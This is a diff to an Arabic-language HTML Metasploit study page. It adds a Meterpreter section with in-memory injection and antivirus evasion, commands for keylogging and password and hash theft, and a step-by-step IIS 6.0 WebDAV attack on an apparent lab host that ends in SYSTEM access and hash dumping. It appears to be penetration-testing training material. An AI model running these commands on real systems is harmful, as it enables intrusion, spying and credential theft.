@@ -307,19 +307,122 @@ msf6 exploit(ms17_010_eternalblue) > <span class="cmd">show payloads</span></div
   <div class="card purple">
     <div class="card-title">👑 Meterpreter — أقوى Payload</div>
     <p style="font-size:12px;color:var(--text);line-height:1.8;margin-bottom:12px;">
-      يشتغل بتقنية <strong style="color:var(--purple);">DLL Injection</strong> — يعيش كاملاً في الذاكرة (RAM) ولا يكتب أي ملفات على الهارد ديسك = Antivirus وForensics ما يشوفونه!
+      يشتغل بتقنية <strong style="color:var(--purple);">DLL Injection</strong> — يعيش كاملاً في الذاكرة (RAM) ولا يكتب أي ملفات على الهارد ديسك = Antivirus وForensics ما يشوفونه! كل الاتصالات مشفرة بـ <strong style="color:var(--purple);">AES Encryption</strong>.
     </p>
-    <div class="lbl">أوامر Meterpreter المهمة:</div>
-    <div class="code"><span class="cmd">getuid</span>           <span class="cmt"># بدل whoami في Windows</span>
-<span class="cmd">sysinfo</span>          <span class="cmt"># معلومات الجهاز</span>
-<span class="cmd">hashdump</span>         <span class="cmt"># سرقة الـ password hashes</span>
-<span class="cmd">keyscan_start</span>    <span class="cmt"># تسجيل ضربات الكيبورد</span>
-<span class="cmd">screenshot</span>       <span class="cmt"># لقطة شاشة</span>
-<span class="cmd">getsystem</span>        <span class="cmt"># محاولة رفع صلاحيات لـ SYSTEM</span>
-<span class="cmd">load kiwi</span>        <span class="cmt"># تحميل Mimikatz لسرقة كلمات السر</span>
-<span class="cmd">shell</span>            <span class="cmt"># فتح CMD عادي داخل Meterpreter</span>
-<span class="cmd">background</span>       <span class="cmt"># إرسال الجلسة للخلفية</span></div>
-    <div class="alert success">🎯 getuid طلع NT AUTHORITY\SYSTEM = أعلى صلاحية في Windows!</div>
+
+    <div class="sec-label">► كيف يشتغل Meterpreter في الخلفية</div>
+    <div class="code"><span class="cmt"># الخطوات التلقائية بعد نجاح الـ exploit:</span>
+1. الضحية يشغّل كود الـ <span class="val">Stager</span> الصغير
+        ↓
+2. الـ Stager يحمل الـ <span class="purple">Reflective DLL</span>
+   ويحقنها في الذاكرة (بدون كتابة على الهارد!)
+        ↓
+3. قلب Meterpreter (Core) يشتغل
+   ويفتح اتصال مشفر <span class="val">AES</span> مع جهازك
+        ↓
+4. Metasploit ترفع الـ extensions تلقائياً:
+   <span class="ok">stdapi</span>  ← أوامر السيستم والملفات
+   <span class="ok">priv</span>    ← أوامر رفع الصلاحيات</div>
+
+    <div class="sec-label">► أهداف التصميم الثلاثة</div>
+    <div class="grid-2">
+      <div class="info-box">
+        <div class="info-box-title">🕵️ Stealthy — خفي</div>
+        <div style="font-size:11px;color:var(--text);line-height:1.8;margin-top:6px;">
+          ما يعمل process جديدة<br>
+          يحقن نفسه في process شغّالة<br>
+          <span style="color:var(--purple);">migrate</span> = ينقل لـ process ثانية<br>
+          لو الضحية أغلق البرنامج = ما تخسر الاتصال!
+        </div>
+      </div>
+      <div class="info-box">
+        <div class="info-box-title">💪 Powerful + Extensible</div>
+        <div style="font-size:11px;color:var(--text);line-height:1.8;margin-top:6px;">
+          نظام اتصالات بـ Channels<br>
+          تفتح CMD عادي وأنت جوه Meterpreter<br>
+          تحمّل extensions وأنت شغّال<br>
+          بدون ما تعيد بناء الـ payload!
+        </div>
+      </div>
+    </div>
+
+    <div class="sec-label">► أوامر Meterpreter الكاملة</div>
+    <div class="code"><span class="cmt"># معلومات الجهاز:</span>
+<span class="cmd">getuid</span>              <span class="cmt"># مين أنت (بدل whoami)</span>
+<span class="cmd">sysinfo</span>             <span class="cmt"># معلومات الجهاز كاملة</span>
+<span class="cmd">ps</span>                  <span class="cmt"># عرض الـ processes الشغالة</span>
+
+<span class="cmt"># رفع الصلاحيات:</span>
+<span class="cmd">getsystem</span>           <span class="cmt"># محاولة رفع صلاحيات لـ SYSTEM</span>
+<span class="cmd">steal_token 1836</span>    <span class="cmt"># سرقة token من process محددة (PID)</span>
+<span class="cmd">migrate 1836</span>        <span class="cmt"># الانتقال لـ process ثانية</span>
+
+<span class="cmt"># سرقة البيانات:</span>
+<span class="cmd">hashdump</span>            <span class="cmt"># سرقة password hashes من SAM</span>
+<span class="cmd">lsa_dump_sam</span>        <span class="cmt"># سحب SAM database كاملة</span>
+<span class="cmd">lsa_dump_secrets</span>    <span class="cmt"># سحب LSA Secrets (باسوردات الخدمات)</span>
+
+<span class="cmt"># تجسس:</span>
+<span class="cmd">keyscan_start</span>       <span class="cmt"># تسجيل ضربات الكيبورد</span>
+<span class="cmd">keyscan_dump</span>        <span class="cmt"># عرض ما سُجّل</span>
+<span class="cmd">screenshot</span>          <span class="cmt"># لقطة شاشة</span>
+
+<span class="cmt"># إضافات:</span>
+<span class="cmd">load kiwi</span>           <span class="cmt"># تحميل Mimikatz لسرقة كلمات السر</span>
+
+<span class="cmt"># التنقل:</span>
+<span class="cmd">shell</span>               <span class="cmt"># فتح CMD عادي داخل Meterpreter</span>
+<span class="cmd">background</span>          <span class="cmt"># إرسال الجلسة للخلفية</span></div>
+
+    <div class="sec-label">► سيناريو كامل — IIS 6.0 WebDAV Attack</div>
+    <div class="code"><span class="cmt"># 1. Scan:</span>
+msf6 > <span class="cmd">db_nmap -sV -p- -T5 -A 10.10.10.15</span>
+<span class="ok">80/tcp open  http  Microsoft IIS httpd 6.0</span>
+
+<span class="cmt"># 2. البحث عن ثغرة IIS 6.0 (CVE-2017-7269 - WebDAV):</span>
+msf6 > <span class="cmd">use exploit/windows/iis/iis_webdav_upload_asp</span>
+msf6 exploit > <span class="cmd">set RHOST 10.10.10.15</span>
+msf6 exploit > <span class="cmd">set LHOST tun0</span>
+msf6 exploit > <span class="cmd">run</span>
+<span class="ok">[*] Meterpreter session 1 opened!</span>
+
+<span class="cmt"># 3. شوف صلاحياتك:</span>
+meterpreter > <span class="cmd">getuid</span>
+<span class="err">[-] Access is denied.</span>   <span class="cmt"># ما عندك صلاحية!</span>
+
+<span class="cmt"># 4. شوف الـ processes:</span>
+meterpreter > <span class="cmd">ps</span>
+<span class="val">1836  wmiprvse.exe  NT AUTHORITY\NETWORK SERVICE</span>
+
+<span class="cmt"># 5. سرق الـ Token من wmiprvse.exe:</span>
+meterpreter > <span class="cmd">steal_token 1836</span>
+meterpreter > <span class="cmd">getuid</span>
+<span class="ok">NT AUTHORITY\NETWORK SERVICE</span>
+
+<span class="cmt"># 6. ابحث عن ثغرات PrivEsc:</span>
+meterpreter > <span class="cmd">background</span>
+msf6 > <span class="cmd">use post/multi/recon/local_exploit_suggester</span>
+msf6 post > <span class="cmd">set SESSION 1</span>
+msf6 post > <span class="cmd">run</span>
+<span class="ok">[+] exploit/windows/local/ms15_051_client_copy_image</span>
+
+<span class="cmt"># 7. استخدم الثغرة للـ PrivEsc:</span>
+msf6 > <span class="cmd">use exploit/windows/local/ms15_051_client_copy_image</span>
+msf6 exploit > <span class="cmd">set SESSION 1</span>
+msf6 exploit > <span class="cmd">run</span>
+<span class="ok">[*] Meterpreter session 2 opened!</span>
+
+meterpreter > <span class="cmd">getuid</span>
+<span class="ok">NT AUTHORITY\SYSTEM</span>   <span class="cmt"># 💥 أعلى صلاحية!</span>
+
+<span class="cmt"># 8. سرق الـ Hashes:</span>
+meterpreter > <span class="cmd">hashdump</span>
+<span class="ok">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span>
+meterpreter > <span class="cmd">lsa_dump_sam</span>
+meterpreter > <span class="cmd">lsa_dump_secrets</span></div>
+
+    <div class="alert danger">⚠️ تنبيه مهم: الـ exploit رفع ملف metasploit28857905.txt على الجهاز وما قدر يمسحه (403 Forbidden). ملفات بأسماء مكشوفة = خطر! الـ Sysadmin ممكن يكتشف الهجمة فوراً.</div>
+    <div class="alert success">🎯 SYSTEM level = تقدر تستخدم الـ hashes لـ Lateral Movement في الشبكة الداخلية (Pivoting)!</div>
   </div>
 
   <div class="card">
